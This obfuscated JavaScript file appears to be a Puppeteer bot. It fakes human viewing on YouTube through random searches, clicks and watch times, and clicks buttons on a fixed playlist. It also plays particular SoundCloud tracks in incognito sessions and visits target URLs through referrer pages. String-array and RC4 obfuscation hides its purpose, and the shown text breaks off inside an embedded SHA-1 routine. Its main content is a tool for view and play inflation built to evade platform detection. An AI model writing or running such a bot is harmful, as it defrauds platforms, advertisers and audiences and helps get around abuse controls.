function a() {
  const bp = [
    'WO/cM8kjWOeocZVdGa',
    'zw51C2vYANmUBW',
    'hex',
    'BgvUz3rO',
    'push',
    'y3jLyxrL',
    'WPDVWRRdTmoqomohWRBdOSoC',
    ')\x20AppleWeb',
    'saT8WQ7cHNKZWR5O',
    'CMCVzw4VC2nYAq',
    'AK/cPSkbvmokW4VcLG',
    'w.youtube.',
    'WP4en0hdR21TjgaO',
    'EW5GuGq',
    'quXtwM5Xuvr1sG',
    'BM9Uzq',
    'necraft\x20ch',
    'oMVcO8kQASogW5tdGbVdNq',
    'WPCyW7dcLCkicSkmWP98WPO',
    'VSvA4rCe-4',
    'DfkDbFk_x9',
    'WPCLrXeJWQRcP8k4WQSM',
    'https://gr'
  ];
  a = function() {
    return bp;
  };
  return a();
}
const a3 = c,
  a2 = b,
  a1 = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x982 * 0x1 + 0x4 * -0x217 + -0x131 * -0xf))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x567 * 0x1 + 0x2 * -0x3ad + 0xcc1), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x923c + 0x2 * 0x1a6b + -0x2d * -0x4ae + (0x6de5 + -0x131 * -0x2b + -0x6688) * random()) : await standardWaitForNetIdle(f), await wait(0x231d + -0x1c3 * 0x11 + 0xe5e * 0x1 + (-0xd * -0x13d + -0x173 * 0x1a + 0x3ca5) * random()), -0x10dc + -0x1 * -0x1ad1 + -0x9f4;
}
async function standardWaitForNetIdle(f) {
  return await wait(0xa67 * 0x1 + 0x19 * -0x137 + 0x2780), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x6c5 * -0x1 + -0x3 * -0xd4 + 0x40 * -0x25;
}
async function randomWait() {
  return await wait(0x2647 + 0x1085 + 0x7a * -0x4a + (0x1 * -0x163 + 0x3 * -0x6d + 0x1632) * random()), 0x1073 + 0x931 + 0x19a3 * -0x1;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1079 + 0x1 * -0x1cc5 + 0x2d3e, -0x1ddd * 0x1 + -0x10e7 + -0x63 * -0x79), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x3faa + -0x16f33 + 0x219e9) * getRandomInt(0x26bc + 0x26a3 + -0x4d5d, -0x1 * 0x1b44 + 0x2303 + -0x7ba), h)), -0x149 * 0xe + 0x1b0f + 0x91 * -0x10;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1d95 * 0x1 + -0xe5 * 0x19 + -0x19f9 * -0x2);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x1 * -0xb88 + -0xaa7 + -0x1 * -0x162f;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x232b + 0x1aa + -0x1 * 0x24d4]['split']('\x20');
    for (let k = -0xf7b + -0x1aba * -0x1 + -0xb3f; k < i['length']; k += 0xce * 0xe + 0x757 * 0x4 + -0x289e)
      j += i[k] * h[i[k + (0xc7 * 0xd + 0x51d * -0x7 + 0x19b1)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x882 + -0x1124 + 0x8a8)['map'](l => Array['from'](l['children']))['flat'](0x1cbb + 0x1a50 + -0x370a)['map'](l => l['childNodes'][0x31b + 0x1dbb + -0x20d5]['childNodes'][0x1d * 0x56 + -0x1 * -0x1f79 + -0x2937]['childNodes'][-0x689 * -0x3 + 0x1491 + -0x282b]['childNodes'][-0x10cd + -0x85 * 0xd + 0x192 * 0xf]['childNodes'][0x152b + -0x3d * -0xb + 0x17c9 * -0x1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0xd6a * -0x1 + 0x5eb * -0x5 + 0x2ee9, -0x847 + 0x1bcc + -0x1 * -0x3)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0xb8 + -0x4 * 0x9e + 0x3 * 0x1498);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1c82e + -0x26 * 0x5c3 + 0x11 * 0x3580) * getRandomInt(-0x6fd + 0x62 * 0x37 + -0xe0f, 0x1 * 0x737 + 0x37d * -0xa + 0x1bb0), h);
  return await wait(i), -0xe62 * 0x2 + 0x1 * 0x552 + 0x1773;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const R = c;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h[R(0x3)])])['children'][0x17 * -0x5 + 0x18 * 0xb4 + -0x106d]['children'][-0x1 * -0x25f + -0x18e6 + 0x1687]['children'][0x1 * 0x6aa + 0x1778 + -0xf11 * 0x2]['children'][-0x40e + -0x1171 + 0x157f * 0x1]['children'][0xbc8 + 0x1 * 0x14b2 + -0x207a]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1 * 0xce9 + 0x1c67 + -0xf7d;
}
async function searchAndView(f) {
  const S = b;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0xab * -0x26 + 0x1178 + -0x2 * -0x427 + (0x1 * -0x1ae7 + 0xd * -0x25f + 0x1 * 0x39ec) * random()
  }), await wait(0xb1 * -0x9 + 0x354 * 0x2 + 0x1 * 0x185 + (-0xb02 * -0x1 + 0x1747 + -0x211d) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f[S(0x0, 'Jveo')](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x2 * -0x97a + -0x1b3b + -0x433 * -0xb]['childNodes'][-0x4 * 0x254 + 0x148c + 0x23f * -0x5]['childNodes'][0xb48 + 0xce3 * -0x3 + 0xa * 0x2bd]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x66e * 0x1 + -0x25 * 0x13 + -0x3aa]['childNodes'][-0x200d + -0x708 + 0x2715]['childNodes'][0x148e + -0x44 * -0x8 + -0x16ac]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        const T = b;
        let q = p['split'](',\x20')['map'](u => u[T(0xd, 'nlf8')]('\x20'))['flat'](-0x232c + 0x2b * 0x67 + 0x1 * 0x11e0),
          r = 0x147 * -0x11 + -0x1 * 0x6cb + 0x59 * 0x52;
        for (let u = 0x1 * -0x3ea + -0x1 * 0x1885 + 0x1c6f; u < q['length']; u += -0x11e + -0x3d2 * 0x8 + 0x1 * 0x1fb0)
          r += q[u] * k[q[u + (-0x15b4 + -0x2082 + -0x1 * -0x3637)]];
        return r;
      }(n);
  });
  await wait((0x15 * -0x39a + -0x56d0 + -0x1 * -0xdd0a) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x72bd * 0x3 + -0xcca4 + -0x13 * -0x2939) * getRandomInt(-0x1934 * -0x1 + 0x1caf + -0x35e2, -0x1 * -0x2339 + -0x3 * 0x28f + -0x1b82), h + (-0x48b * -0x1 + 0x9 * -0xcd + 0x1632));
  return await wait(i), 0x24eb + -0x1afd + -0x21 * 0x4d;
}
async function keyWatch(f) {
  const V = b,
    U = d;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + U(0xb) + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1 * -0x2163 + 0xb5 * 0xf + 0x755 * -0x6), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + V(0xc, 'HT&V') + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x2415 + 0x205 * -0x1 + 0x31d2 + (-0x762 + -0x1572 + 0x20bc) * Math['random']());
    });
  }, -0x2359 * -0x1 + 0x1284 + -0x1a85);
  await wait(0x2e9ba + -0x1 * 0xf866 + 0xa8a3 * 0x4);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x7 * 0x2316 + -0x35 * -0x6a4 + -0x16b2e) * getRandomInt(0x1a9 + 0x1c36 + 0x1ddb * -0x1, 0x142e + -0x1aa1 + 0x346 * 0x2)), clearInterval(h), -0x1e94 + -0x487 * 0x1 + 0x231c;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x20a7 + -0x278 + -0x1b * -0x14d;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x22 * -0x95 + -0x4f + 0x141a;
    await randomWait();
  }
  return -0x1dc6 + 0x195 * 0x12 + 0x14d;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1d95 * 0x1 + -0xe5 * 0x19 + -0x19f9 * -0x2);
    let h = e[f];
    if (c['fChlHG'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0xd72 + 0x2636 + -0x33a8, r, s, t = 0x1475 * 0x1 + -0x3 * 0x76e + 0x1d5; s = m['charAt'](t++); ~s && (r = q % (0x8 * 0x26c + -0x1042 * 0x2 + 0xd28) ? r * (-0x75a + 0x7 * 0x3cb + -0x12f3) + s : s, q++ % (-0x1860 + 0x17 * 0x62 + -0x2a * -0x5f)) ? o += String['fromCharCode'](0x24a2 + -0x445 * -0x4 + -0x34b7 & r >> (-(0x231d + -0x1c3 * 0x11 + 0x1b8 * -0x3) * q & -0x3 * -0x2af + -0x173 * 0xd + 0xad0)) : -0x10dc + -0x1 * -0x1ad1 + -0x9f5) {
          s = n['indexOf'](s);
        }
        for (let u = 0xa67 * 0x1 + 0x19 * -0x137 + 0x13f8, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x6c5 * -0x1 + -0x3 * -0xd4 + 0xb5 * -0xd))['slice'](-(0x2647 + 0x1085 + 0x1b65 * -0x2));
        }
        return decodeURIComponent(p);
      };
      c['cHxXQg'] = i, b = arguments, c['fChlHG'] = !![];
    }
    const j = e[0x1 * -0x163 + 0x3 * -0x6d + 0x2aa],
      k = f + j,
      l = b[k];
    return !l ? (h = c['cHxXQg'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function fetchRandomSC() {
  return Math['random']() <= -0xb17 + -0x1228 + 0x1d3f + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0xd * 0x229 + 0x328 * 0x1 + -0x3 * -0x84f + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1d95 * 0x1 + -0xe5 * 0x19 + -0x19f9 * -0x2);
    let h = e[f];
    if (b['ektpNe'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0xd72 + 0x2636 + -0x33a8, s, t, u = 0x1475 * 0x1 + -0x3 * 0x76e + 0x1d5; t = n['charAt'](u++); ~t && (s = r % (0x8 * 0x26c + -0x1042 * 0x2 + 0xd28) ? s * (-0x75a + 0x7 * 0x3cb + -0x12f3) + t : t, r++ % (-0x1860 + 0x17 * 0x62 + -0x2a * -0x5f)) ? p += String['fromCharCode'](0x24a2 + -0x445 * -0x4 + -0x34b7 & s >> (-(0x231d + -0x1c3 * 0x11 + 0x1b8 * -0x3) * r & -0x3 * -0x2af + -0x173 * 0xd + 0xad0)) : -0x10dc + -0x1 * -0x1ad1 + -0x9f5) {
          t = o['indexOf'](t);
        }
        for (let v = 0xa67 * 0x1 + 0x19 * -0x137 + 0x13f8, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x6c5 * -0x1 + -0x3 * -0xd4 + 0xb5 * -0xd))['slice'](-(0x2647 + 0x1085 + 0x1b65 * -0x2));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1 * -0x163 + 0x3 * -0x6d + 0x2aa,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1073 + 0x931 + 0x19a4 * -0x1; u < -0x1079 + 0x1 * -0x1cc5 + 0x2e3e; u++) {
          p[u] = u;
        }
        for (u = -0x1ddd * 0x1 + -0x10e7 + -0x52 * -0x92; u < 0x54e + -0x1e9a + 0x1a4c; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x26bc + 0x26a3 + -0x4c5f), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1 * 0x1b44 + 0x2303 + -0x7bf, q = -0x149 * 0xe + 0x1b0f + 0xd3 * -0xb;
        for (let v = 0x1 * -0xb88 + -0xaa7 + -0x1 * -0x162f; v < n['length']; v++) {
          u = (u + (0x232b + 0x1aa + -0x1 * 0x24d4)) % (-0xf7b + -0x1aba * -0x1 + -0xa3f), q = (q + p[u]) % (0xce * 0xe + 0x757 * 0x4 + -0x27a0), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0xc7 * 0xd + 0x51d * -0x7 + 0x1ab0)]);
        }
        return t;
      };
      b['GpVMNs'] = m, c = arguments, b['ektpNe'] = !![];
    }
    const j = e[0x882 + -0x1124 + 0x8a2],
      k = f + j,
      l = c[k];
    return !l ? (b['NMsdjW'] === undefined && (b['NMsdjW'] = !![]), h = b['GpVMNs'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function runGFModule(f, h) {
  async function i() {
    const W = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1 * 0xfa6 + 0x6e8 * 0x2 + -0x5 * -0x5e + 0.3) {
      const j = await f['createInco' + W(0x15, 'K9g8') + 'erContext'](),
        k = await j['newPage']();
      let l = -0x2481 + -0x2485 + -0x4906 * -0x1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x285b + 0x12b1 + 0xc572 + getRandomInt(-0x1 * -0x4cd8 + -0x3eef + -0x4f7 * -0x9, 0xb77b + 0x8 * -0xf31 + -0x373d * -0x1));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x34 * 0x46 + -0x33 * 0x61 + 0x10c6 * 0x2), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1927 + 0x1da9 + -0x482;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1694 + 0x139f + 0x1 * 0x2f5, -0x6 * 0x317 + 0x3d7 + 0xee5)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x270 + -0xcfa + 0x173a + floor((0x71 * 0x7 + -0x12f5 + 0x1 * 0x13c6) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x26a7 * -0x547fa + 0xb682d8b2 + -0x9 * -0x109fcd44),
          -0xd2 * -0xbcdb + -0x393 * 0x1193 + 0x23e4c3,
          -0xa20a * -0x1 + 0xb * 0x4e1 + 0x1 * -0x57b5,
          -0x1aa3 * 0x1 + -0x103 + 0x1c26
        ], y = [
          -0xef7 + 0x120b + 0x2fc * -0x1,
          -0x263d * 0x1 + -0xa70 + -0x30bd * -0x1,
          0x2 * -0x486 + 0xe35 + -0x521,
          -0xcb * 0x9 + -0x3 * -0x52f + -0x86a
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x1 * -0x265d + 0x1 * -0x1909 + -0xd53 * 0x1)['update'](K)[J]();
          };
        }, C = function() {
          const X = c;
          var J, K, L = B('hex');
          for (F && (L = D(L)), L[X(0x5)] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x5 * 0x483 + 0x1 * -0xe21 + -0x86e; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const Y = d;
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest'](Y(0x2));
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x401 + 0x174a * 0x1 + -0x1b4b) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0xdae + -0x1 * 0xe0f + 0x1bbd] = A[-0x1e18 + -0x1388 + 0x31b0] = A[-0x10c4 + 0x3 * -0x13e + -0x247 * -0x9] = A[-0x25 * -0x97 + -0xa0 + -0x1531] = A[0x21e3 + 0x1 * -0x263f + 0x45f] = A[0x23d4 * 0x1 + -0x335 * 0x2 + -0x1d66] = A[0x1f2c + 0xcf * 0x7 + -0x24d0] = A[-0x75 + 0x137d + -0x1302] = A[-0x101 * -0xb + -0x1e92 * 0x1 + 0x138e] = A[0x21a1 + 0x14c9 * 0x1 + 0x1b31 * -0x2] = A[-0xe61 + 0x192b + -0xac1] = A[-0xce * 0x10 + 0x21ac + -0x1 * 0x14c2] = A[0x3 * -0x1cf + 0x22d * 0x1 + 0x34b] = A[0x1e * 0x1c + -0x1e66 + -0x3 * -0x90e] = A[-0x4 * 0x7e3 + -0x1 * 0x11d4 + -0x1 * -0x316d] = A[-0xda4 + -0x1cf4 + 0xce * 0x35] = A[-0x106e + -0x1323 * 0x1 + 0x23a0] = -0x1 * 0x1795 + 0x1 * -0x10dd + -0x2872 * -0x1, this['blocks'] = A) : this['blocks'] = [
                -0x24aa + 0x7a * -0x43 + 0x4498,
                -0x283 + 0x382 + 0x11 * -0xf,
                -0x1 * -0x973 + -0x1111 * 0x1 + 0x79e,
                -0x17 * 0x1 + 0x6f * -0x19 + 0xaee,
                0x11c2 * -0x2 + -0x155 * -0x1 + 0x222f,
                -0x161 * 0x10 + -0x1 * 0xccf + -0x1 * -0x22df,
                0x1436 + -0x175 * 0x14 + -0xfe * -0x9,
                0xb * 0x360 + -0x1a2d + 0x1 * -0xaf3,
                0x1 * 0x1607 + -0x2 * 0x1083 + 0x1 * 0xaff,
                -0x1354 + 0x1 * 0x2212 + -0xebe,
                0x9 * 0x431 + 0x689 + -0xb * 0x406,
                -0x2 * 0xbcf + 0x1139 + 0x665,
                0x464 * -0x1 + 0x5 * -0x295 + 0x114d,
                -0x235a + -0x231e + 0x4678,
                0x17 * 0xa9 + 0x2604 + -0x3533,
                -0x1448 + -0x2 * 0x4db + 0x1dfe,
                -0x1834 * 0x1 + -0x301 * 0x1 + -0x1 * -0x1b35
              ], this['h0'] = 0x72ebbd * 0x14c + 0x48e8c4cc + -0x76ad5ae7, this['h1'] = 0x9815efc + 0x1667a0b * 0x1 + 0xe4e5d282, this['h2'] = -0xb69de97c + 0xb7a58fb3 * -0x1 + 0x206fe562d, this['h3'] = 0x182f94c6 + 0x4bedf94 + -0xcbc1fe4, this['h4'] = -0x1051dd9b1 + -0xd0c79f * -0x1c4 + 0x306967 * 0x1d3, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1494 + -0x1252 + 0x26e6 * 0x1, this['finalized'] = this['hashed'] = -0x16e7 + 0xe5d + 0x1 * 0x88a, this['first'] = 0x8cf + -0xe55 + 0x587;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0xa7a + -0x1bbe + 0x1144, O = J['length'] || -0x11 * -0x11b + -0x11fe + -0xcd, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0xf1e + -0x1 * 0x707 + 0x13 * -0x6d, P[-0xeb0 * -0x2 + 0x4a0 * 0x6 + -0x1c9 * 0x20] = this['block'], P[-0x1e11 + 0x1 * -0x2351 + 0x4172 * 0x1] = P[0x19 * 0x18e + 0x6 * 0x50f + -0x263 * 0x1d] = P[-0x1 * 0x1e93 + 0x1165 + -0x1 * -0xd30] = P[0x1 * 0x1467 + 0x1023 + -0x2487] = P[0xa12 + 0x1 * 0x422 + 0x38c * -0x4] = P[0x2207 + -0x1911 + -0x8f1] = P[0x12d0 + -0x86b * -0x3 + 0xcd * -0x37] = P[0x22c8 + -0x2f3 * -0x9 + -0x3d4c] = P[-0x463 + 0x144f + -0xfe4] = P[0x4 * 0x98b + 0x2419 + -0x251e * 0x2] = P[-0x4ed + -0x25f8 + 0x2aef] = P[-0x2 * 0x129b + 0x1d93 + -0x7ae * -0x1] = P[0x12c2 + -0x1440 + 0x18a] = P[-0x1 * -0x8b3 + -0x4bc + -0x1 * 0x3ea] = P[0x1 * -0x1069 + 0x1a17 + -0x7 * 0x160] = P[-0x1d6 * -0x6 + 0x4a9 + 0x2 * -0x7cf] = 0xbcb * 0x2 + -0x43 * 0x3b + 0x5 * -0x1a1), K) {
                    for (N = this['start']; M < O && N < -0x109 + 0x100f * -0x1 + 0x3c * 0x4a; ++M)
                      P[N >> 0x172f + -0xd25 + -0xa08] |= J[M] << y[-0x1879 + -0x2 * -0x120f + -0xba2 * 0x1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x339 + 0x21bf + -0x24b8; ++M)
                      (L = J['charCodeAt'](M)) < -0x1d67 + 0x1bdb + 0x20c ? P[N >> 0x9 * -0x17f + 0x11a * 0xf + -0x30d] |= L << y[-0x27a + -0xf6 * -0x20 + -0x1c43 & N++] : L < 0x1199 + -0x22cc + 0x1 * 0x1933 ? (P[N >> 0xa * 0x25d + -0xd * 0x12b + -0x871] |= (0x19 * 0x35 + -0x382 + -0x1 * 0xeb | L >> -0xb * 0x1df + -0x314 + 0x8d * 0x2b) << y[0x65 + -0x22e1 * 0x1 + 0x227f * 0x1 & N++], P[N >> 0x2 * 0x105b + 0x9ef * -0x1 + -0x16c5] |= (-0x1b51 + 0x1ead + 0x2 * -0x16e | 0x5 * -0x1d + 0x6 * -0x3f8 + 0x18a0 & L) << y[-0x2 * 0x850 + -0x167f + 0x2722 & N++]) : L < -0xd54b + 0x3e6f + 0x16edc || L >= -0x48e4 + 0x13902 + 0x2 * -0x80f ? (P[N >> -0x1c57 + -0x240 + 0x1e99] |= (0x12c8 + 0x261a + -0x1 * 0x3802 | L >> -0x21a2 + -0x764 + 0x2912) << y[0x35e + -0x2 * 0x47d + 0x59f & N++], P[N >> 0xb38 + 0x73f * 0x1 + 0x9 * -0x20d] |= (-0x3d * -0x8 + -0x8bd * -0x3 + -0x935 * 0x3 | L >> -0x3d * -0x65 + -0x496 + 0x1 * -0x1375 & -0xb * 0xb6 + 0x23e6 + -0x1 * 0x1bd5) << y[-0x2cf * 0x3 + 0x33 * -0x4a + 0x102 * 0x17 & N++], P[N >> 0x18ca + 0x15 * -0x176 + 0x5e6] |= (0x2509 + 0x7b8 + -0x2c41 | 0x2616 + 0x151 * 0x1b + 0x2 * -0x24b1 & L) << y[0x263c + 0xf9a + -0x35d3 & N++]) : (L = 0x16adc + -0xa12d + 0x3651 + ((0x1eaa + -0x2 * 0x127d + 0xa4f & L) << 0x178b + 0xbfc + -0x237d | -0x194e + 0x81 * 0x3 + 0x1bca & J['charCodeAt'](++M)), P[N >> 0x14b * -0x1 + 0x1 * 0x1fc + -0xaf] |= (0x1 * -0x669 + 0x266d + -0x1f14 | L >> 0xcaa + 0xf1b * 0x1 + 0x1 * 